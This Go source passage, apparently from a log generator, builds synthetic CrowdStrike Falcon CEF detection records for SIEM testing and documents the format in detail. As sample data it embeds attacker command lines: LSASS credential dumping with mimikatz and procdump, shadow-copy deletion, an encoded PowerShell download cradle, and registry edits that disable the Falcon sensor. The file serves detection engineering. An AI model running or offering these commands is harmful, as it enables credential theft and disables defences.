package catalog

import (
	"fmt"
	"strings"

	"github.com/theshahrukh98khan/LogGen/internal/core"
)

// CrowdStrike Falcon (EDR / XDR) controls.
//
// # Which wire format these records use, and why
//
// Falcon itself has no on-premises appliance that speaks syslog. Events reach a
// SIEM through the Falcon SIEM Connector (cs.falconhoseclientd), a host-side
// daemon that consumes the Falcon Streaming API and re-emits each event. The
// connector can emit raw Streaming API JSON, or it can flatten each event into
// CEF or LEEF using a mapping config, and only the flattened forms are pushed
// to a syslog server:
//
//	[Settings]
//	output_format = syslog     ; "Use syslog format if CEF/LEEF output is required"
//	[Syslog]
//	send_to_syslog_server = true
//	host = <SIEM_IP>
//	port = 514
//	protocol = tcp
//
// Raw JSON output is written to /var/log/crowdstrike/falconhoseclient/output and
// is not sent over the wire by the connector at all. So a Wazuh manager with a
// syslog listener receives CEF (the common choice, and what Microsoft Sentinel,
// Rapid7 InsightIDR, Google SecOps and Logpoint all document for this vendor)
// rather than Streaming API JSON. **These controls implement CEF.**
//
// # The format
//
// Seven pipe-separated header fields, then space-separated key=value extensions:
//
//	CEF:0|CrowdStrike|FalconHost|1.0|<signature id>|<name>|<severity>|<extensions>
//
// The first four are fixed by the connector's header_prefix setting. The last
// three come from each event type's __header.0/1/2 mapping, which is why they
// differ per event type and why two of them are literal strings for the audit
// events. Escaping follows the connector's own settings, not the ArcSight
// defaults:
//
//	escape_header = "|":"\|","\\":"\\\\"
//	escape_ext    = "\\":"\\\\","=":"\=","\n":"\\n","\r":"\\r"
//
// Backslash escaping is the one point where the available evidence disagrees.
// The mapping config's escape_ext says a backslash is doubled, which is also
// what CEF itself requires, and a raw capture pasted into a Graylog issue shows
// filePath=\\Device\\HarddiskVolume2\\Windows\\System32. Rapid7 published a
// sample that instead shows filePath=\Device\HarddiskVolume2\... with single
// backslashes, but that line has plainly been hand-edited: its externalId and
// the sensor id inside its own cs6 link do not match each other. So its
// backslash count is not trustworthy. These records double the backslash,
// following the config and the raw capture. Everything else in the Rapid7 line
// is reproduced exactly. If your decoder sees single backslashes on the wire,
// that is the one thing to change.
//
// Note what is NOT escaped: spaces inside extension values are left alone, so
// values such as act=Exploit Mitigation and deviceProcessName=CrowdStrike
// Authentication contain literal spaces. A decoder that splits extensions on
// whitespace will mangle these; splitting on `\s+(?=\w+=)` is the workable
// approach. That quirk is reproduced here deliberately.
//
// Two time conventions coexist and are easy to get wrong:
//
//   - rt carries metadata.eventCreationTime verbatim, which is epoch
//     milliseconds ("rt=1594167159000"), not a formatted date.
//   - deviceCustomDate1 is the only key listed in the connector's time_fields,
//     so it alone is rendered with time_format = MMM dd yyyy HH:mm:ss
//     ("deviceCustomDate1=Jun 25 2019 18:26:31"). deviceCustomDate2 is not in
//     time_fields and stays a raw epoch integer.
//
// Extension key order is fixed (keys_ordered = true), and the order used below
// is the order in which the mapping config lists each key.
//
// # Sources
//
//   - Falcon SIEM Connector CEF mapping config (cs.falconhoseclient.cef.cfg),
//     published in full by Logpoint:
//     https://archive-docs.guardsix.com/docs/crowdstrike/en/latest/CEF%20Sample%20Configuration.html
//   - Rapid7 InsightIDR CrowdStrike Falcon event source, which publishes a
//     captured DetectionSummaryEvent CEF line:
//     https://docs.rapid7.com/insightidr/crowdstrike-falcon-event-source/
//   - Microsoft Sentinel's CrowdStrikeFalconEventStream parser, which is written
//     against CommonSecurityLog where DeviceVendor == "CrowdStrike" and
//     DeviceProduct == "FalconHost", and enumerates the cs/cn label values:
//     https://github.com/Azure/Azure-Sentinel/blob/master/Solutions/CrowdStrike%20Falcon%20Endpoint%20Protection/Parsers/CrowdStrikeFalconEventStream.yaml
//   - Microsoft Sentinel connector page confirming the SIEM Connector forwards
//     syslog in CEF:
//     https://learn.microsoft.com/azure/sentinel/data-connectors/deprecated-crowdstrike-falcon-endpoint-protection-via-legacy-agent
//   - Elastic's CrowdStrike integration pipeline fixtures, which carry real
//     Streaming API events and so real OperationName / ServiceName / Tactic /
//     Technique / PatternDispositionDescription values:
//     https://github.com/elastic/integrations/tree/main/packages/crowdstrike/data_stream/falcon/_dev/test/pipeline
//   - Quadrant's Sagan ruleset for CrowdStrike, written against real forwarded
//     records, which supplies further DetectDescription and OperationName
//     literals: https://github.com/quadrantsec/sagan-rules/blob/main/crowdstrike.rules
//
// # Confirmed
//
//   - Header prefix "CEF:0|CrowdStrike|FalconHost|1.0|" (connector config,
//     Rapid7 sample, Sentinel parser all agree).
//   - DetectionSummaryEvent header is <eventType>|<Tactic>|<Severity>, e.g.
//     "DetectionSummaryEvent|Exploit|4", and its extension key set and order:
//     externalId cn2Label cn2 cn1Label cn1 dhost duser msg fname filePath
//     cs5Label cs5 fileHash dntdom cs6Label cs6 cn3Label cn3 rt src smac cat
//     act reason outcome CSMTRPatternDisposition. Verified byte for byte
//     against the Rapid7 sample line.
//   - cn1=ParentProcessId, cn2=ProcessId, cn3=Offset, cs5=CommandLine,
//     cs6=FalconHostLink (config + Sentinel parser).
//   - Detection subtype headers: the six literal __header.0 strings ("DNS
//     Request In A Detection Summary Event", "Network Access In A Detection
//     Summary Event", "Document Access In A Detection Summary Event", "AV Scan
//     Results In A Detection Summary Event", "Executable Written In A Detection
//     Summary Event", "Quarantined Files In A Detection Summary Event") and
//     their cs1/cs2/cs3/cs4 assignments.
//   - AuthActivityAuditEvent header is <OperationName>|<OperationName>|1 with
//     cat=AuthActivityAuditEvent in the extensions, verified against two
//     captured lines (Rapid7-cited and a Graylog community capture):
//     "CEF:0|CrowdStrike|FalconHost|1.0|validateEntitlementsHmac|
//     validateEntitlementsHmac|1|cat=AuthActivityAuditEvent
//     destinationTranslatedAddress=... duser=Customer
//     deviceProcessName=CrowdStrike Authentication cn3Label=Offset cn3=354
//     outcome=true deviceCustomDate1Label=Timestamp
//     deviceCustomDate1=Jun 25 2019 18:26:31 rt=1561512391596".
//   - UserActivityAuditEvent, IncidentSummaryEvent, FirewallMatchEvent and the
//     RemoteResponseSession* headers and key sets, from the mapping config.
//   - OperationName / ServiceName literals: userAuthenticate,
//     twoFactorAuthenticate, changePassword, requestResetPassword,
//     selfAcceptEula, streamStarted, streamStopped, validateEntitlementsHmac
//     ("CrowdStrike Authentication", "Crowdstrike Streaming API"),
//     detection_update ("detections"), update_group ("groups"),
//     containment_requested and lift_containment_requested.
//   - Tactic, Technique, Objective, SeverityName, PatternDispositionValue and
//     PatternDispositionDescription literals, and the DetectDescription strings
//     used in msg, are all taken from captured events rather than paraphrased.
//
// # NOT confirmed — read before writing a decoder against these
//
//   - The published mapping config is Logpoint's redistribution of the
//     connector's cef.cfg. Each detection section in it carries an extra
//     "# Enriched section" block (detectionId, sha256fileHash, severityName,
//     parentCommandLine, hostGroups, tags, the pdf_* pattern-disposition flags,
//     and the policy_* attributes on UserActivityAuditEvent). Those keys are
//     NOT emitted here, because a stock connector config does not produce them
//     and the Rapid7 capture does not contain them. If your estate runs the
//     enriched config, expect those additional keys.
//   - The prevention-policy control below uses OperationName "update_policy"
//     with ServiceName "prevention_policies". That such events exist is certain
//     (the enriched config maps event.Attributes.policy_id, policy_name,
//     policy_type, policy_enabled and policy_assignment_rule under
//     UserActivityAuditEvent), but the exact OperationName and ServiceName
//     strings were not found in any captured sample. Treat that one pair as
//     inferred.
//   - Older connector releases used a different DetectionSummaryEvent mapping
//     (shost/suser/sntdom and cs1Label=CommandLine instead of dhost/duser/dntdom
//     and cs5Label=CommandLine). These controls follow the current mapping, the
//     one the Sentinel parser and the Rapid7 capture both agree on.
//   - The FirewallMatchEvent section of the published config assigns matchCount
//     twice and networkProfile twice (the second is plainly meant to be
//     policyName). The sane reading is emitted below rather than the duplicate.
//   - The syslog hostname is whatever the connector host is called; there is no
//     vendor-mandated value. "falcon-siem-connector" is used here.
//   - CustomerIOCEvent, IdentityProtectionEvent, HashSpreadingEvent and the
//     Mobile/CSPM event types define fewer than three header fields in the
//     mapping config, which yields a short and arguably malformed CEF header.
//     They are deliberately left out rather than guessed at.

const (
	csCEFVersion = "CEF:0"
	csVendor     = "CrowdStrike"
	csProduct    = "FalconHost"
	csProductVer = "1.0"
)

// csHeaderEscape applies the connector's escape_header setting.
func csHeaderEscape(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	return strings.ReplaceAll(s, "|", `\|`)
}

// csExtEscape applies the connector's escape_ext setting. Spaces are left
// alone, which is the vendor's behaviour and not a mistake here.
func csExtEscape(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, "=", `\=`)
	s = strings.ReplaceAll(s, "\n", `\n`)
	return strings.ReplaceAll(s, "\r", `\r`)
}

// csKV renders one extension pair.
func csKV(k, v string) string { return k + "=" + csExtEscape(v) }

// csRecord assembles a full CEF line. severity is a string because the mapping
// config supplies it either from event.Severity or as a literal such as '1'.
func csRecord(sigID, name, severity string, ext []string) string {
	return fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s",
		csCEFVersion, csVendor, csProduct, csProductVer,
		csHeaderEscape(sigID), csHeaderEscape(name), csHeaderEscape(severity),
		strings.Join(ext, " "))
}

// csEventTime renders metadata.eventCreationTime: epoch milliseconds, verbatim.
func csEventTime(c *core.Ctx) string {
	return fmt.Sprint(c.Now.UnixMilli())
}

// csDeviceDate renders deviceCustomDate1, the connector's only time_field, with
// its time_format of MMM dd yyyy HH:mm:ss.
func csDeviceDate(c *core.Ctx) string { return c.Now.Format("Jan 02 2006 15:04:05") }

// csOffset is the Falcon stream offset that rides on cn3 for most event types.
func csOffset(c *core.Ctx) string { return fmt.Sprint(c.Int(1000, 9999999)) }

// csSensorID is the AID: 32 lowercase hex characters identifying the sensor.
func csSensorID(c *core.Ctx) string { return c.HexLower(32) }

// csCID is the customer ID that every FalconHostLink carries.
func csCID(c *core.Ctx) string { return c.HexLower(32) }

// csProcessID renders a Falcon process id, which is a large composite integer
// rather than an OS pid.
func csProcessID(c *core.Ctx) string {
	return fmt.Sprintf("%d%d", c.Int(10000, 99999), c.Int(100000000, 999999999))
}

// csMAC renders a MAC the way Falcon does: lowercase, dash separated.
func csMAC(c *core.Ctx) string {
	return strings.ReplaceAll(c.MAC(), ":", "-")
}

// csDetectionLink builds the console deep link that lands in cs6. sensorID and
// cid are passed in rather than generated so they match the rest of the record.
func csDetectionLink(c *core.Ctx, sensorID, cid string) string {
	return "https://falcon.crowdstrike.com/activity/detections/detail/" +
		sensorID + "/" + fmt.Sprint(c.Int(100000000, 999999999)) +
		"?_cid=" + cid
}

func crowdstrikePayload(c *core.Ctx, severity int, msg string) core.Payload {
	return core.Payload{
		Kind: core.SourceCrowdStrike,
		// No syslog tag: the CEF record is the whole message, and a tag would
		// place "cs.falconhoseclient: " in front of "CEF:0|...".
		Host: "falcon-siem-connector",
		// The connector's syslog handler defaults to local0 in every
		// deployment guide that names a facility.
		Facility: core.FacLocal0,
		Severity: severity,
		Message:  msg,
	}
}

// csDetect carries the values a DetectionSummaryEvent record needs. Each is
// generated once by the caller so the same host, user and sensor id appear in
// every place the record repeats them.
type csDetect struct {
	tactic    string // event.Tactic   -> header field 6 and cat
	technique string // event.Technique -> act
	objective string // event.Objective -> reason
	severity  string // event.Severity  -> header field 7, 1 to 5
	desc      string // event.DetectDescription -> msg
	fileName  string
	filePath  string
	cmdLine   string
	// PatternDispositionValue -> outcome, PatternDispositionDescription ->
	// CSMTRPatternDisposition. These two always move together.
	dispValue string
	dispDesc  string
}

// Pattern dispositions seen in captured events. The value is a bit field; the
// description is the vendor's own rendering of it.
var (
	csDispDetect      = [2]string{"0", "Detection, standard detection."}
	csDispWouldBlock  = [2]string{"2304", "Detection, process would have been blocked if related prevention policy setting was enabled."}
	csDispBlocked     = [2]string{"2048", "Prevention, process was blocked from execution."}
	csDispOpBlocked   = [2]string{"1024", "Prevention, operation blocked"}
	csDispQuarantined = [2]string{"2052", "Prevention, quarantined file."}
)

// csDetectionExt renders a DetectionSummaryEvent's extensions in the exact key
// order the mapping config lists them.
func csDetectionExt(c *core.Ctx, d csDetect, host, user, sensorID, cid string) []string {
	return []string{
		csKV("externalId", sensorID),
		csKV("cn2Label", "ProcessId"),
		csKV("cn2", csProcessID(c)),
		csKV("cn1Label", "ParentProcessId"),
		csKV("cn1", csProcessID(c)),
		csKV("dhost", host),
		csKV("duser", user),
		csKV("msg", d.desc),
		csKV("fname", d.fileName),
		csKV("filePath", d.filePath),
		csKV("cs5Label", "CommandLine"),
		csKV("cs5", d.cmdLine),
		csKV("fileHash", c.HexLower(32)),
		csKV("dntdom", c.Env.NetBIOS),
		csKV("cs6Label", "FalconHostLink"),
		csKV("cs6", csDetectionLink(c, sensorID, cid)),
		csKV("cn3Label", "Offset"),
		csKV("cn3", csOffset(c)),
		csKV("rt", csEventTime(c)),
		csKV("src", c.InternalIP()),
		csKV("smac", csMAC(c)),
		csKV("cat", d.tactic),
		csKV("act", d.technique),
		csKV("reason", d.objective),
		csKV("outcome", d.dispValue),
		csKV("CSMTRPatternDisposition", d.dispDesc),
	}
}

// csDetection builds a complete DetectionSummaryEvent payload.
func csDetection(c *core.Ctx, d csDetect, sysSev int) core.Payload {
	host := c.P("host", c.Workstation())
	user := c.P("user", c.User())
	sensorID := csSensorID(c)
	cid := csCID(c)
	return crowdstrikePayload(c, sysSev, csRecord(
		"DetectionSummaryEvent", d.tactic, d.severity,
		csDetectionExt(c, d, host, user, sensorID, cid)))
}

// csDetectParams is the param set every detection control exposes.
var csDetectParams = []core.Param{pUser, param("host", "Endpoint", "auto")}

func init() {
	registerCrowdStrikeDetections()
	registerCrowdStrikeDetectionSubtypes()
	registerCrowdStrikeIncidents()
	registerCrowdStrikeResponse()
	registerCrowdStrikeAudit()
}

// ---------------------------------------------------------------------------
// Detections: DetectionSummaryEvent
// ---------------------------------------------------------------------------

func registerCrowdStrikeDetections() {
	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-credential-dump", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Credential dumping from LSASS",
			Desc:    "Falcon flagged a process reading LSASS memory. Tactic Credential Access, technique OS Credential Dumping.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelCritical,
			Mitre:    []string{"T1003.001"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			tool := c.Pick("mimikatz.exe", "procdump64.exe", "rundll32.exe")
			return csDetection(c, csDetect{
				tactic: "Credential Access", technique: "OS Credential Dumping",
				objective: "Gain Access", severity: "5",
				desc:      "Malicious artifacts were identified in memory",
				fileName:  tool,
				filePath:  `\Device\HarddiskVolume2\Users\Public`,
				cmdLine:   c.Pick(`mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"`, `procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp`, `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 656 C:\Users\Public\l.dmp full`),
				dispValue: csDispBlocked[0], dispDesc: csDispBlocked[1],
			}, core.SevCrit)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-ransomware", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Ransomware behaviour",
			Desc:    "A process associated with ransomware was detected. Tactic Impact, technique Data Encrypted for Impact.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelCritical,
			Mitre:    []string{"T1486"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			bin := c.Pick("lockbit.exe", "svchost32.exe", "encryptor.exe")
			return csDetection(c, csDetect{
				tactic: "Impact", technique: "Data Encrypted for Impact",
				objective: "Follow Through", severity: "5",
				desc:      "A process associated with ransomware was detected on your host.",
				fileName:  bin,
				filePath:  `\Device\HarddiskVolume2\Users\Public\Downloads`,
				cmdLine:   `C:\Users\Public\Downloads\` + bin + " -enc -path C:\\",
				dispValue: csDispBlocked[0], dispDesc: csDispBlocked[1],
			}, core.SevCrit)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-shadow-copy-delete", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Volume shadow copy deletion",
			Desc:    "A process tried to delete shadow copies, the standard ransomware precursor that removes the recovery path.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelCritical,
			Mitre:    []string{"T1490"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			return csDetection(c, csDetect{
				tactic: "Impact", technique: "Inhibit System Recovery",
				objective: "Follow Through", severity: "5",
				desc:      "A process attempted to delete a Volume Shadow Snapshot.",
				fileName:  "vssadmin.exe",
				filePath:  `\Device\HarddiskVolume2\Windows\System32`,
				cmdLine:   "vssadmin.exe delete shadows /all /quiet",
				dispValue: csDispBlocked[0], dispDesc: csDispBlocked[1],
			}, core.SevCrit)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-powershell-download", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "PowerShell download cradle",
			Desc:    "A PowerShell process fetched and ran a remote payload. Tactic Execution.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1059.001", "T1105"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			return csDetection(c, csDetect{
				tactic: "Execution", technique: "Command and Scripting Interpreter",
				objective: "Falcon Detection Method", severity: "4",
				desc:      "A PowerShell process downloaded and launched a remote file.",
				fileName:  "powershell.exe",
				filePath:  `\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0`,
				cmdLine:   `powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==`,
				dispValue: csDispDetect[0], dispDesc: csDispDetect[1],
			}, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-process-injection", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Process injection",
			Desc:    "A process injected into another in an unusual way, the classic loader behaviour.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1055"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			return csDetection(c, csDetect{
				tactic: "Defense Evasion", technique: "Process Injection",
				objective: "Falcon Detection Method", severity: "4",
				desc:      "A suspicious process injected into another process in an unusual way.",
				fileName:  "rundll32.exe",
				filePath:  `\Device\HarddiskVolume2\Windows\System32`,
				cmdLine:   `rundll32.exe C:\Users\Public\beacon.dll,StartW`,
				dispValue: csDispBlocked[0], dispDesc: csDispBlocked[1],
			}, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-sensor-tamper", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Falcon sensor tampering",
			Desc:    "Something tried to alter the Falcon sensor itself. Blinding the EDR is usually the step before everything else.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelCritical,
			Mitre:    []string{"T1562.001"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			desc := c.Pick(
				"A process attempted to modify Falcon sensor configuration via the registry.",
				"A process attempted to modify Falcon sensor related service binaries.",
				"A process attempted to modify Falcon sensor service configuration via the registry.",
				"A process appears to be tampering with the Falcon sensor configuration",
			)
			return csDetection(c, csDetect{
				tactic: "Defense Evasion", technique: "Impair Defenses",
				objective: "Keep Access", severity: "5",
				desc:      desc,
				fileName:  "reg.exe",
				filePath:  `\Device\HarddiskVolume2\Windows\System32`,
				cmdLine:   `reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\CSAgent\Sim /v Disabled /t REG_DWORD /d 1 /f`,
				dispValue: csDispOpBlocked[0], dispDesc: csDispOpBlocked[1],
			}, core.SevCrit)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-sensor-uninstall", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Falcon sensor uninstall attempt",
			Desc:    "An attempt to remove the sensor's files or installer. Treated separately from configuration tampering because the response differs.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelCritical,
			Mitre:    []string{"T1562.001"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			desc := c.Pick(
				"A process attempted to modify Falcon sensor installer related files",
				"A process attempted to modify Falcon sensor core driver files",
				"A process attempted to perform a file system operation in a protected Falcon folder location",
			)
			return csDetection(c, csDetect{
				tactic: "Defense Evasion", technique: "Impair Defenses",
				objective: "Keep Access", severity: "5",
				desc:      desc,
				fileName:  "WindowsSensor.exe",
				filePath:  `\Device\HarddiskVolume2\Program Files\CrowdStrike`,
				cmdLine:   `WindowsSensor.exe /uninstall /quiet MAINTENANCE_TOKEN=0000`,
				dispValue: csDispOpBlocked[0], dispDesc: csDispOpBlocked[1],
			}, core.SevCrit)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-persistence-registry", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Registry run key persistence",
			Desc:    "A suspicious registry change that looks like a persistence mechanism.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1547.001"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			return csDetection(c, csDetect{
				tactic: "Persistence", technique: "Registry Run Keys / Startup Folder",
				objective: "Keep Access", severity: "4",
				desc:      "A process made a suspicious change to the registry that might indicate a malicious persistence mechanism.",
				fileName:  "reg.exe",
				filePath:  `\Device\HarddiskVolume2\Windows\System32`,
				cmdLine:   `reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\svc.exe /f`,
				dispValue: csDispDetect[0], dispDesc: csDispDetect[1],
			}, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-privilege-escalation", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Privilege escalation",
			Desc:    "A process escalated its privileges in a way Falcon treats as adversary behaviour.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1068", "T1548"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			return csDetection(c, csDetect{
				tactic: "Privilege Escalation", technique: "Abuse Elevation Control Mechanism",
				objective: "Gain Access", severity: "4",
				desc:      "A process has escalated privileges, this could be as a result of an adversary's attempt to bypass access controls or as part of legitimate system administration.",
				fileName:  "fodhelper.exe",
				filePath:  `\Device\HarddiskVolume2\Windows\System32`,
				cmdLine:   "fodhelper.exe",
				dispValue: csDispDetect[0], dispDesc: csDispDetect[1],
			}, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-lateral-discovery", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Lateral movement reconnaissance",
			Desc:    "Built-in enumeration commands run ahead of lateral movement.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelMedium,
			Mitre:    []string{"T1069.002", "T1087.002"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			return csDetection(c, csDetect{
				tactic: "Lateral Movement", technique: "Remote Services",
				objective: "Falcon Detection Method", severity: "2",
				desc:      `The command "net group" was executed, which attackers often use for lateral movement.`,
				fileName:  "net1.exe",
				filePath:  `\Device\HarddiskVolume2\Windows\System32`,
				cmdLine:   `"C:\WINDOWS\system32\net1.exe" group "Domain Admins" /domain`,
				dispValue: csDispDetect[0], dispDesc: csDispDetect[1],
			}, core.SevNotice)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-ml-malicious-file", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "On-sensor machine learning detection",
			Desc:    "A written file crossed the on-sensor ML confidence threshold. Tactic is the literal Machine Learning, not an ATT&CK tactic.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1204.002"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			bin := c.Pick("invoice_scan.exe", "setup_x64.exe", "update.dll")
			return csDetection(c, csDetect{
				tactic: "Machine Learning", technique: "Malicious File",
				objective: "Falcon Detection Method", severity: "4",
				desc:      "A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files.",
				fileName:  bin,
				filePath:  `\Device\HarddiskVolume2\Users\Public\Downloads`,
				cmdLine:   `C:\Users\Public\Downloads\` + bin,
				dispValue: csDispQuarantined[0], dispDesc: csDispQuarantined[1],
			}, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-malware", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Known malware executed",
			Desc:    "A known-bad binary launched. Tactic Malware, technique Malicious File.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelCritical,
			Mitre:    []string{"T1204.002"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			bin := c.Pick("choice.exe", "svch0st.exe", "winlogon32.exe")
			return csDetection(c, csDetect{
				tactic: "Malware", technique: "Malicious File",
				objective: "Falcon Detection Method", severity: "5",
				desc:      "A suspicious process related to a likely malicious file was launched.",
				fileName:  bin,
				filePath:  `\Device\HarddiskVolume2\Windows\System32`,
				cmdLine:   `C:\Windows\System32\` + bin,
				dispValue: csDispBlocked[0], dispDesc: csDispBlocked[1],
			}, core.SevCrit)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-exploit-mitigation", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Exploit blocked",
			Desc:    "Falcon's exploit mitigation stopped a heap spray. This mirrors the vendor's published sample line.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1203"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			return csDetection(c, csDetect{
				tactic: "Exploit", technique: "Exploit Mitigation",
				objective: "Falcon Detection Method", severity: "4",
				desc:      "Detected and blocked a heap spray attempt, which was likely part of an attempted exploit.",
				fileName:  "Acrobat.exe",
				filePath:  `\Device\HarddiskVolume2\Program Files (x86)\Adobe\Acrobat 11.0\Acrobat`,
				cmdLine:   `"C:\Program Files (x86)\Adobe\Acrobat 11.0\Acrobat\Acrobat.exe" -Embedding`,
				dispValue: csDispOpBlocked[0], dispDesc: csDispOpBlocked[1],
			}, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-custom-ioc", Source: core.SourceCrowdStrike,
			Group: "Detections", Name: "Custom IOC match",
			Desc:    "A hash or domain matched a custom intelligence indicator the team uploaded.",
			EventID: "DetectionSummaryEvent", Channel: "DetectionSummaryEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1204.002"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			return csDetection(c, csDetect{
				tactic: "Custom Intelligence", technique: "Indicator of Compromise",
				objective: "Falcon Detection Method", severity: "5",
				desc:      "A SHA256 hash matched a Custom Intelligence Indicator (Custom IOC) with critical severity.",
				fileName:  "loader.exe",
				filePath:  `\Device\HarddiskVolume2\Users\Public`,
				cmdLine:   `C:\Users\Public\loader.exe`,
				dispValue: csDispBlocked[0], dispDesc: csDispBlocked[1],
			}, core.SevCrit)
		},
	})

}

// ---------------------------------------------------------------------------
// Detection subtypes: one syslog line per nested object on a detection
// ---------------------------------------------------------------------------

func registerCrowdStrikeDetectionSubtypes() {
	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-network-access", Source: core.SourceCrowdStrike,
			Group: "Detection detail", Name: "Network access in a detection",
			Desc:    "The connection a detected process made. This is the C2 egress record: src, dst, spt, dpt all populated.",
			EventID: "DetectionSummaryEvent", Channel: "NetworkAccesses",
			Severity: core.SevLabelCritical,
			Mitre:    []string{"T1071.001"},
			Params:   []core.Param{pUser, param("host", "Endpoint", "auto"), pDstIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			sensorID := csSensorID(c)
			cid := csCID(c)
			local := c.InternalIP()
			remote := c.P("dstip", c.ExternalIP())

			ext := []string{
				csKV("externalId", sensorID),
				csKV("cn2Label", "ProcessId"),
				csKV("cn2", csProcessID(c)),
				csKV("dhost", host),
				csKV("duser", user),
				csKV("fname", "rundll32.exe"),
				csKV("filePath", `\Device\HarddiskVolume2\Windows\System32`),
				csKV("cs5Label", "CommandLine"),
				csKV("cs5", `rundll32.exe C:\Users\Public\beacon.dll,StartW`),
				csKV("dntdom", c.Env.NetBIOS),
				csKV("c6a2", local),
				csKV("dst", remote),
				csKV("c6a3", remote),
				csKV("spt", fmt.Sprint(c.EphemeralPort())),
				csKV("dpt", "443"),
				csKV("cs6Label", "FalconHostLink"),
				csKV("cs6", csDetectionLink(c, sensorID, cid)),
				csKV("cn3Label", "Offset"),
				csKV("cn3", csOffset(c)),
				csKV("deviceCustomDate1Label", "Network Access Timestamp"),
				csKV("deviceCustomDate1", csDeviceDate(c)),
				csKV("rt", csEventTime(c)),
				csKV("src", local),
				csKV("smac", csMAC(c)),
				csKV("cat", "Command and Control"),
				csKV("act", "Application Layer Protocol"),
				csKV("reason", "Keep Access"),
